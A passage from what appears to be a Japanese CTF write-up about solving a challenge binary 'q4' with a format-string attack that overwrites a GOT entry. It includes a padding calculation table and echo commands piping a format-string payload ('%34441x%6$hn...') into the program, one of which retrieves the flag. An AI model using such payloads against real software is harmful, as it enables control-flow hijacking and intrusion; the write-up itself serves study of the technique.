<ul><li>ref. https://stackoverflow.com/questions/8121823/gdb-pipe-redirection-error-gdb-hangup-detected-on-fd-0</li></ul></li> <li>引数ではなく, 呼び出す番地が正しくないという仮説をたててみる</li> <li>fopenを直接呼ぶのではなく, その少し前を呼ぶのはどう?</li> <li>jne命令がある(0x0804868f)ので, その後(0x08048691)からなら呼べそう</li> <li>まとめると次のような感じ</li></ul> <table><thead><tr><th style="text-align:center;">入力アドレス</th> <th style="text-align:center;">出力バイト数</th> <th style="text-align:center;">総出力バイト数</th> <th style="text-align:center;">補足</th></tr></thead> <tbody><tr><td style="text-align:center;">0x080499f0</td> <td style="text-align:center;">4</td> <td style="text-align:center;">4</td> <td style="text-align:center;">4バイトずつ攻撃</td></tr> <tr><td style="text-align:center;">0x080499f2</td> <td style="text-align:center;">4</td> <td style="text-align:center;">8</td> <td style="text-align:center;">''</td></tr> <tr><td style="text-align:center;">%34441x</td> <td style="text-align:center;">34441</td> <td style="text-align:center;">34449</td> <td style="text-align:center;">34449(0x8691)-8=34441</td></tr> <tr><td style="text-align:center;">%6$n</td> <td style="text-align:center;">0</td> <td style="text-align:center;">34449</td> <td style="text-align:center;">引数は6個目から</td></tr> <tr><td style="text-align:center;">%33139x</td> <td style="text-align:center;">33139</td> <td style="text-align:center;">67588</td> <td style="text-align:center;">67588(0x10804)-34449=33139</td></tr> <tr><td style="text-align:center;">%7$n</td> <td style="text-align:center;">0</td> <td style="text-align:center;">67588</td> <td style="text-align:center;">次は7個目</td></tr></tbody></table> <ul><li>コマンドは次の通り</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token builtin class-name">echo</span> -e <span class="token string">'\xf0\x99\x04\x08\xf2\x99\x04\x08%34441x%6$hn%33139x%7$hn'</span> <span class="token operator">|</span> ./q4
~~ 略 ~~~
Do you want the flag?
</code></pre></div><ul><li>通らない...</li> <li>一応putcharも試す</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token builtin class-name">echo</span> -e <span class="token string">'\xe0\x99\x04\x08\xe2\x99\x04\x08%34441x%6$hn%33139x%7$hn'</span> <span class="token operator">|</span> ./q4
~~ 略 ~~~
FLAG_~~~ 略 ~~~
</code></pre></div><ul><li>通った!!!!!!!</li></ul> <h1 id="感想"><a href="#感想" class="header-anchor">#</a> 感想</h1> <ul><li>通せたのは嬉しい</li> <li>printfは何故に通らなかったの?</li> <li>ハリネズミ本を見返したら, 正しくはformat string attackではなく, got overwriteだったらしい</li></ul></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated: </span> <span class="time">9ヶ月前</span></div></footer> <!----> </main></div><div class="global-ui"><!----><!----></div></div>
    <script src="/assets/js/app.fd83665a.js" defer></script><script src="/assets/js/2.b8499f1b.js" defer></script><script src="/assets/js/83.af84d6f4.js" defer></script><script src="/assets/js/3.31e57b96.js" defer></script>
  </body>
</html>
